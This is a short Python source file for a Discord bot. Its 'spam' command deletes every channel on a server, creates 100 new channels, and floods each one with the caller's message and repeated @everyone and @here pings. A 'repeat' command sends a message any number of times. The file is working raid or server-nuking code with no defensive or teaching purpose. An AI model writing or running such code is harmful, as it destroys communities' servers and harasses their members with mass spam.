from main import bot
from discord.ext import commands

mymessage = ""
@bot.command()
async def spam(ctx:commands.Context,*,message):
    global mymessage
    for channel in ctx.guild.channels:
        try:
                await channel.delete()
        except:
            print('already deleted')
    for i in range(100):
        await ctx.guild.create_text_channel("Bruh")
        mymessage = message

@bot.event
async def on_guild_channel_create(channel):
    global mymessage
    for i in range(20):
        await channel.send(f"@everyone @here {mymessage}")

@bot.command()
async def wipe(ctx:commands.Context):
    for channel in ctx.guild.channels:
        try:
            if channel.name == "bruh":
                await channel.delete()
        except:
            print('already deleted')

@bot.command()
async def repeat(ctx:commands.Context,message:str,times:int):
    for i in range(times):
        await ctx.send(message)